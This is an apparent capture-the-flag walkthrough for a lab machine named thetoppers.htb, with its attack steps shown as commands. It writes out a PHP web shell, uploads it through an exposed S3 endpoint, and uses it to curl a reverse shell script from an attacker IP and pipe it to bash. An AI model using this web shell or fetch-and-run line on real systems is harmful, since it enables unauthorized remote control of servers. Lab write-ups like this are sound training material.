1. First we identify open ports on the machine
2. We identify subdomains
3. Identify which programming language is running on the machine
4. Start doing operations on the services running on the subdomains
5. Create shell.php file to execute commands on the server
6. Get a reverse shell on the server
7. Get the flag

```shell
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```shell
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```php
<?php system($_GET["cmd"]); ?>
```

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now if we go to the following URL we can execute commands on the server:

http://thetoppers.htb/shell.php?cmd=id

```shell
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Wit this knowledge we can now try to get a reverse shell on the server. We can use the script I have under scripts/reverse.sh

Also we are going to need a python server to host the reverse shell script. We can do this by running the following command:

```shell
python3 -m http.server 1234
```

Now we need to download the reverse shell script to the server. We can do this by running the following command:

```shell
curl http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.88:1234/scripts/reverse.sh|bash
```

With this we should have a reverse shell on the server. We can check this by running the following command:

Now do a "cd .." and there is the flag.

```shell
cat flag.txt
```

```shell